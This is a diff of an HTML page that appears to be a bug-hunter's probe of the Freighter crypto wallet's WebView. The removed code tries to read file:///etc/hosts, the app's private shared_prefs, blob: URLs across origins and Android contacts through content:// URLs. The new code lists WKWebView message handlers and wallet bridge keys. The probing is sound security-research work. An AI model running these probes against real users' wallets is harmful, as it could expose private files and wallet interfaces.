@@ -1,111 +1,25 @@
 <!DOCTYPE html>
-<html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Freighter file:// Leak Test - BW</title>
-<style>
-body{background:#fff;color:#000;font-family:monospace;padding:14px;margin:0;font-size:11px}
-h2{font-size:13px;border-bottom:2px solid #000;padding-bottom:6px}
-pre{background:#f5f5f5;border:1px solid #000;padding:10px;white-space:pre-wrap;word-break:break-all;min-height:120px}
-button{background:#000;color:#fff;border:2px solid #000;padding:12px;width:100%;font-weight:bold;margin-top:6px;font-family:monospace}
-button:active{background:#fff;color:#000}
-</style>
-</head>
+<html><head><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Freighter iOS messageHandlers Scan</title>
+<style>body{background:#fff;color:#000;font-family:monospace;padding:14px;font-size:11px}
+pre{background:#f5f5f5;border:1px solid #000;padding:10px;white-space:pre-wrap;word-break:break-all;min-height:200px}
+button{background:#000;color:#fff;border:2px solid #000;padding:12px;width:100%;font-weight:bold;margin-top:6px}</style></head>
 <body>
-<h2>Freighter file:// / blob:// / content:// Leak Scan [BW]</h2>
-<pre id=log>Ready.
-Origin: <span id=origin></span>
-UserAgent: <span id=ua></span>
-
-Klik tombol satu-satu.
-</pre>
-
-<button onclick="test1()">1. Test file:///etc/hosts via fetch</button>
-<button onclick="test2()">2. Test file:///data/data/com.freighter.app/ via XHR</button>
-<button onclick="test3()">3. Test file:// via iframe src</button>
-<button onclick="test4()">4. Test blob: cross-origin fetch</button>
-<button onclick="test5()">5. Test content:// leak</button>
-<button onclick="test6()">6. List WebView config</button>
-
+<h2>Freighter iOS - WKWebView messageHandlers Scanner</h2>
+<pre id=log>Ready. Origin: </pre>
+<button onclick="scan()">SCAN messageHandlers + stellar bridge</button>
 <script>
-document.getElementById('origin').textContent = location.origin;
-document.getElementById('ua').textContent = navigator.userAgent.substring(0,100);
-function log(t){ document.getElementById('log').textContent += '\n'+t; console.log(t); }
-
-async function test1(){
-  log('\n--- [1] fetch("file:///etc/hosts") ---');
-  try{
-    let r = await fetch('file:///etc/hosts');
-    let txt = await r.text();
-    log('STATUS: '+r.status+' len:'+txt.length);
-    log('CONTENT: '+txt.substring(0,300));
-    if(txt.includes('localhost')){ log('>>> CRITICAL: file:// READABLE'); alert('CRITICAL file:// leak!\n'+txt.substring(0,200)); }
-    else log('fetch blocked or empty');
-  }catch(e){ log('FAILED (aman): '+e); }
+document.getElementById('log').textContent+=location.origin+'\nUA:'+navigator.userAgent.substring(0,120)+'\n';
+function log(t){document.getElementById('log').textContent+='\n'+t;}
+function scan(){
+  log('window.freighter:'+!!window.freighter);
+  log('window.stellar:'+!!window.stellar);
+  if(window.stellar) try{log('stellar keys:'+Object.keys(window.stellar).join(', '))}catch(e){}
+  let handlers=window.webkit&&window.webkit.messageHandlers;
+  if(!handlers){log('messageHandlers TIDAK ADA');return;}
+  let keys=Object.keys(handlers);
+  log('messageHandlers:'+keys.length+' -> '+keys.join(', '));
+  keys.forEach(k=>{let h=handlers[k]; log(' - '+k+': postMessage:'+(!!h.postMessage))});
 }
-
-async function test2(){
-  log('\n--- [2] XHR file:///data/data/com.freighter.app/ ---');
-  let paths = [
-    'file:///data/data/app.freighter.mobile/shared_prefs/',
-    'file:///data/data/com.freighter.app/shared_prefs/',
-    'file:///data/data/com.freighter/files/',
-    'file:///proc/self/cmdline'
-  ];
-  for(let p of paths){
-    try{
-      let xhr = new XMLHttpRequest();
-      xhr.open('GET', p, false);
-      xhr.send();
-      log('XHR '+p+' -> '+xhr.status+' len:'+xhr.responseText.length+' : '+xhr.responseText.substring(0,150));
-      if(xhr.status===200 && xhr.responseText.length>0){ log('>>> CRITICAL readable: '+p); }
-    }catch(e){ log('XHR '+p+' FAILED (aman): '+e.message); }
-  }
-}
-
-function test3(){
-  log('\n--- [3] iframe src=file:// ---');
-  let ifr = document.createElement('iframe');
-  ifr.src='file:///etc/hosts';
-  ifr.style.width='100%'; ifr.style.height='100px'; ifr.style.border='1px solid #000';
-  ifr.onload=()=>{ log('iframe onload'); try{ let doc = ifr.contentDocument||ifr.contentWindow.document; log('iframe doc: '+doc.documentElement.innerHTML.substring(0,200)); log('>>> CRITICAL iframe file:// readable'); }catch(e){ log('iframe blocked (aman): '+e); } };
-  document.body.appendChild(ifr);
-}
-
-async function test4(){
-  log('\n--- [4] blob: cross-origin ---');
-  log('A. Buka aqua.network -> console: b=URL.createObjectURL(new Blob(["SECRET-AQUA-"+Date.now()])); localStorage.setItem("test_blob_aqua", b); alert(b)');
-  let blobUrl = prompt('Paste blob URL dari aqua.network:','blob:https://aqua.network/xxx');
-  if(!blobUrl) return;
-  try{
-    let r = await fetch(blobUrl);
-    let txt = await r.text();
-    log('fetch blob: len:'+txt.length+' content:'+txt.substring(0,100));
-    if(txt.includes('SECRET-AQUA')) log('>>> CRITICAL blob: cross-origin readable!');
-  }catch(e){ log('blob fetch FAILED (aman): '+e); }
-}
-
-function test5(){
-  log('\n--- [5] content:// leak ---');
-  let urls = ['content://com.android.contacts/contacts','content://media/external/images/media'];
-  urls.forEach(u=>{
-    let ifr=document.createElement('iframe'); ifr.src=u; ifr.style.display='none';
-    ifr.onload=()=>log(u+' onload - mungkin readable');
-    ifr.onerror=()=>log(u+' onerror (aman)');
-    document.body.appendChild(ifr);
-  });
-}
-
-function test6(){
-  log('\n--- [6] JS Interface ---');
-  log('window.freighter: '+(!!window.freighter));
-  log('window.stellar: '+(!!window.stellar));
-  log('window.ethereum: '+(!!window.ethereum));
-  let props=[];
-  for(let k in window){ if(k.toLowerCase().includes('freighter')||k.toLowerCase().includes('android')||k.toLowerCase().includes('jsinterface')) props.push(k); }
-  log('Props: '+props.join(', '));
-  if(window.freighter) log('freighter keys: '+Object.keys(window.freighter).join(', ').substring(0,200));
-}
-</script>
-</body>
-</html>
+scan();
+</script></body></html>
